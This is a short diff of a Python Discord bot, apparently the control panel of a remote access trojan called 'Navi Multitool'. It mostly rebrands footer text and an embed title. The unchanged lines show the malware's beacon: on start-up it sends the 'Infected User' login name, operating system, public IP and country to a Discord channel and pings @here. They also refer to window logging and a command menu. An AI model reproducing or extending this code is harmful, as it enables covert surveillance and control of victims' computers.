@@ -56,7 +56,7 @@ def navi_embed(text, color=0x00aaff, thumbnail=True):
     embed = discord.Embed(title="NAVI • TERMINAL", description=text, color=color)
     if thumbnail:
         embed.set_thumbnail(url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
-    embed.set_footer(text="rootnv tool • https://github.com/rootdirr/rootnvtool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
+    embed.set_footer(text="Navi Multitool • https://github.com/glockinhand/navi-multitool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
     return embed
 
 
@@ -121,13 +121,13 @@ async def on_ready():
     ip = data.get("ip", "Unknown")
     flag = data.get("country", "US")
     
-    embed = discord.Embed(title="NAVI • !help for commands", color=0x00ff00)
+    embed = discord.Embed(title="NAVI • SESSION ESTABLISHED", color=0x00ff00)
     embed.add_field(name="Session ID", value=f"`{channel_name}`", inline=True)
     embed.add_field(name="Infected User", value=f"`{os.getlogin()}`", inline=True)
     embed.add_field(name="Operating System", value=f"`{platform.system()} {platform.release()}`", inline=False)
     embed.add_field(name="Network Address", value=f"`{ip}` :flag_{flag.lower()}:", inline=True)
     embed.set_thumbnail(url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
-    embed.set_footer(text="rootnv Multitool • github.com/rootdirr/rootnvtool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
+    embed.set_footer(text="Navi Multitool • github.com/glockinhand/navi-multitool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
     
     await channel.send(content="@here", embed=embed)
     game = discord.Game(f"Window logging stopped")
@@ -285,7 +285,7 @@ async def on_message(message):
 
     if message.content == "!help":
         thumb = "https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
-        foot = "rootnv Multitool • github.com/rootdirr/rootnvtool"
+        foot = "Navi Multitool • github.com/glockinhand/navi-multitool"
         e1 = discord.Embed(title="NAVI • COMMANDS (1/2)", color=0x00aaff)
         e1.set_thumbnail(url=thumb)
         e1.add_field(name="📡 System", value=(
